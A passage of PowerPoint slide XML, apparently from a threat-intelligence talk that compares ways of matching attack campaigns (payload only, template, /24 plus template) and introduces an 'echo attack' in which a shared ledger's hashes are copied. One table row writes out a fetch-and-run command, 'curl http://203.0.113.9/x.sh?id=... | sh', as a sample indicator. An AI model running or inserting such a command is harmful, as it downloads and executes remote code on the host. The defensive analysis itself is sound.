                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx2"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Never wrong, but misses varied attacks</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="475488">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Payload only</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>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curl http://203.0.113.9/x.sh?id=a3f9c2e1 | sh</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="Courier New" charset="0"/>
                        <a:ea typeface="Courier New" charset="0"/>
                        <a:cs typeface="Courier New" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx2"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Common commands collide</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="475488">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Template</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>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curl http://&lt;IP&gt;/x.sh?id=&lt;TOKEN&gt; | sh</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="Courier New" charset="0"/>
                        <a:ea typeface="Courier New" charset="0"/>
                        <a:cs typeface="Courier New" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx2"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Merges campaigns using the same tool</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="475488">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/24 + template</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>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198.51.100.0/24 + template</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1100" dirty="0">
                        <a:latin typeface="Courier New" charset="0"/>
                        <a:ea typeface="Courier New" charset="0"/>
                        <a:cs typeface="Courier New" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Best balance in our tests</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="accent5"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A new threat: the echo attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="echo board"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="4114800" cy="3154680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="echo board header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1463040"/>
            <a:ext cx="3657600" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHARED LEDGER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="echo board post 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1828800"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="echo board post 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="1828800"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P1  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87…fd58</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="echo board post 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2267712"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="echo board post 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2267712"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P2  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5403…d1ca</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="echo board post 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2706624"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="echo board post 3 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2706624"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P3  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>36af…caf1</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="echo board post 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3145536"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="echo board post 4 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3145536"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Echo  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87…fd58</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   copied</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="echo board post 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3584448"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="echo board post 5 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3584448"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Echo  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5403…d1ca</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   copied</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="echo board post 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4023360"/>
            <a:ext cx="3657600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="echo board post 6 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="4023360"/>
            <a:ext cx="3383280" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
